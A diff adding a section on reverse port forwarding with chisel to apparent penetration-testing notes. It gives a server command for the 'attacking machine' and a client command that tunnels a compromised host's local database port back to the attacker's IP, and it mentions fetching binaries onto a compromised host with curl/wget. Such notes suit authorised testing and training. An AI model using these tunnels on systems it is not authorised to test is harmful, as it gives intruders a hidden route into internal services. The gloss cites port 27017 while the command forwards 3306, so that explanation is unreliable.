@@ -21,3 +21,26 @@ Download the binary in compromised host using curl/wget.
 jobs
 kill PID
 ```
+
+#### Chisel
+
+##### Reverse Port Forwarding with Chisel
+###### In attacking machine
+```
+chisel server --host 10.50.102.117  -p 1234 --reverse
+
+    server: run the server mode
+    -p : port for the server to listen on
+    --reverse: allows reverse port forwarding
+```
+###### In Compromised Machine
+
+```
+chisel client 10.50.102.117:1234 R:2222:127.0.0.1:3306/tcp
+
+    client : run the client mode
+    10.50.102.117:1234 : the IP address of the attacker’s machine and the port that was specified in the chisel server command
+    R:2222:127.0.0.1:27017/tcp: the R means we want to perform a reverse port forward; 2222 is the port number we want to use to route traffic through on the attacker’s machine; 127.0.0.1:27017 is the IP address/port we want to route our traffic to on the client’s machine; /tcp means we want to use the TCP protocol.
+```
+
+
